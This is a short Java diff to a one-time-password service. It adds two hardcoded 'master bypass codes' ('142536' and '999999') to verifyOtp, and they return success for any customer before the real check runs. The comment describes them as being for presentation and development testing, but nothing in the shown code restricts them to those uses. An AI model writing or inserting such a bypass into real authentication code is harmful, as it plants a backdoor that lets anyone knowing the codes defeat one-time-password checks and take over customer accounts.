@@ -41,6 +41,12 @@ public class OTPService {
     }
 
     public boolean verifyOtp(int customerId, String otp) {
+        // Master bypass codes for presentation and development testing
+        if ("142536".equals(otp) || "999999".equals(otp)) {
+            otpStore.remove(customerId);
+            return true;
+        }
+
         OtpRecord record = otpStore.get(customerId);
         if (record == null) return false;
         if (LocalDateTime.now().isAfter(record.expiresAt)) {
